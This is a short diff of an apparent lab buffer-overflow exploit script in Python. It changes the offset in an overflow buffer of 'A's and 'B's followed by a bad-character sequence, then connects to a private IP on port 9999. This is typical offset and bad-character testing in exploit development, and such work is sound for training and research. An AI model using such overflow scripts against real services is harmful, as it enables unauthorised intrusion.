@@ -23,7 +23,7 @@ badchars = (
   "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
 
-shellcode = "A"* 2003 + "B"* 4 + badchars
+shellcode = "A"* 2002 + "B"* 4 + badchars
 try:
       s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('192.168.40.135',9999))
